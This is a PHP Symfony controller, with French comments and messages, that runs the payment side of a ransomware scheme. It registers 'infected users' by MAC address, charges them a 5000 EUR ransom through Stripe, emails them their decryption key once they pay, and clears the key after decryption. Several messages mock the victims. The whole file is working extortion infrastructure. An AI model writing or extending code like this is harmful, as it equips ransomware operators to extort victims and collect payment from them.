<?php

namespace App\Controller\Api;

use App\Controller\BaseController;
use App\Entity\Transaction;
use App\Repository\TransactionRepository;
use App\Service\Mailer\MailerService;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Mailer\Exception\TransportExceptionInterface;
use Symfony\Component\Routing\Annotation\Route;

class TransactionController extends BaseController
{
    public function __construct(
        private TransactionRepository $transactionRepository,
        private MailerService $mailer
    )
    {}

    /**
     * @Route("/stripe_create", methods={"GET"})
     */
    public function stripeCreate(Request $request): Response
    {
        try {
            $user = $this->getInfectedUser();

            if(!$user) {
                throw $this->createAccessDeniedException();
            }

            $transaction = $this->transactionRepository->findLastOneByUser($user);

            if (null === $transaction) {
                $transaction = (new Transaction())
                    ->setAmount(5000)
                    ->setUser($user)
                    ->setLabel('Paiement en cours depuis '.$user->getMacAddress())
                    ->setPaymentStatus(Transaction::TRANSACTION_STATUS_PAYMENT_INTENT);
            } else {
                if(in_array($transaction->getPaymentStatus(), [
                    Transaction::TRANSACTION_STATUS_PAYMENT_SUCCESS,
                    Transaction::TRANSACTION_USER_FILE_DECRYPTED
                ])) {
                    return $this->json([
                        'error' => true,
                        'message' => "Tu as déjà payé, regarde tes mails !"
                    ]);
                }
            }

            \Stripe\Stripe::setApiKey($this->getParameter('app.stripe.keys.private'));

            if (null === $transaction->getStripePaymentIntentId()) {
                $paymentIntent = \Stripe\PaymentIntent::create([
                    'amount' => $transaction->getAmount() * 100,
                    'currency' => 'eur',
                ]);
            } else {
                $paymentIntent = \Stripe\PaymentIntent::update(
                    $transaction->getStripePaymentIntentId(),
                    ['metadata' => [
                        'amount' => $transaction->getAmount() * 100,
                        'currency' => 'eur',
                    ]]
                );
            }

            $transaction->setPaymentStatus(Transaction::TRANSACTION_STATUS_PAYMENT_INTENT);
            $transaction->setStripePaymentIntentId($paymentIntent->id);
            $transaction->setStripeCustomerId($paymentIntent->customer);

            $this->transactionRepository->save($transaction, true);

            $output = [
                'clientSecret' => $paymentIntent->client_secret,
                'transaction' => $transaction,
            ];

            return $this->json($output);
        } catch (\Error $e) {
            return $this->failure(
                [
                    'error' => $e->getMessage() ?? 'Une erreur est survenue'
                ],
                Response::HTTP_INTERNAL_SERVER_ERROR
            );
        }
    }

    /**
     * @Route("/payment_success", methods={"GET"})
     */
    public function paymentSuccess(Request $request): Response
    {
        try {
            $user = $this->getInfectedUser();

            if(!$user) {
                throw $this->createAccessDeniedException();
            }

            $payment_method_id = $request->get('pm');

            \Stripe\Stripe::setApiKey($this->getParameter('app.stripe.keys.private'));

            // Récupération de la transaction en cours s'il y en a une
            $transaction = $this->transactionRepository->findLastOneByUserAndStatus(
                $user,
                [Transaction::TRANSACTION_STATUS_PAYMENT_INTENT]
            );

            if (null === $transaction) {
                throw $this->createNotFoundException();
            }

            $transaction->setLabel('Paiement depuis '.$user->getIp());

            $payment_method = \Stripe\PaymentMethod::retrieve($payment_method_id);

            $exp_month = '';
            $exp_month .= $payment_method->card->exp_month < 10 ? '0' : '';
            $exp_month .= $payment_method->card->exp_month;

            $userPaymentMethod = [
                'card' => [
                    'brand' => $payment_method->card->brand,
                    'country' => $payment_method->card->country,
                    "exp_month" => $exp_month,
                    "exp_year" => $payment_method->card->exp_year,
                    "last4" => $payment_method->card->last4
                ]
            ];

            $transaction->setPaymentMethod(json_encode($userPaymentMethod));
            $this->transactionRepository->save($transaction, true);

            $transaction->setPaymentStatus(Transaction::TRANSACTION_STATUS_PAYMENT_SUCCESS);
            $this->transactionRepository->save($transaction, true);

            $this->mailer->send(
                'gege@dec.com',
                $user->getEmail(),
                'Your decryption software',
                'emails/decrypt_email.html.twig',
                [
                    'decryptKey' => $user->getEncryptionKey()
                ]
            );

            return $this->json([
                'success' => true,
                'message' => 'Paiement effectué... Merci pour les sous-sous dans la po-poche ! Regarde tes mails ;)'
            ]);
        } catch (\Error | TransportExceptionInterface $e) {
            return $this->failure(
                [
                    'error' => $e->getMessage() ?? 'Une erreur est survenue'
                ],
                Response::HTTP_INTERNAL_SERVER_ERROR
            );
        }
    }

    /**
     * @Route("/decrypt_success/{macAddress}", methods={"GET"})
     */
    public function decryptSuccess($macAddress): Response
    {
        try {
            $user = $this->getUserRepository()->findOneBy(['macAddress' => $macAddress]);

            if (!$user) {
                throw $this->createNotFoundException();
            }

            $transaction = $this->transactionRepository->findLastOneByUserAndStatus($user, [Transaction::TRANSACTION_STATUS_PAYMENT_SUCCESS]);

            if (!$transaction) {
                throw $this->createNotFoundException();
            }

            $transaction->setPaymentStatus(Transaction::TRANSACTION_USER_FILE_DECRYPTED);
            $user->setEncryptionKey(null);

            $this->getUserRepository()->save($user, true);
            $this->transactionRepository->save($transaction, true);

            return $this->json([
                'success' => true,
                'message' => 'Fichiers décryptés et transaction modifiée'
            ]);
        } catch(\Error $e) {
            return $this->failure(
                [
                   'error' => $e->getMessage() ?? 'Une erreur est survenue'
                ],
                Response::HTTP_INTERNAL_SERVER_ERROR
            );
        }
    }

    /**
     * @Route("/api/transactions/{id}", methods={"GET"})
     */
    public function show($id): Response
    {
        try {
            $transaction = $this->transactionRepository->find($id);

            if(!$transaction) {
                throw $this->createNotFoundException();
            }

            return $this->json([
                'success' => true,
                'transaction' => $transaction
            ]);
        } catch(\Error $e) {
            return $this->failure($e->getMessage() ?? 'Une erreur est survenue', Response::HTTP_INTERNAL_SERVER_ERROR);
        }
    }
}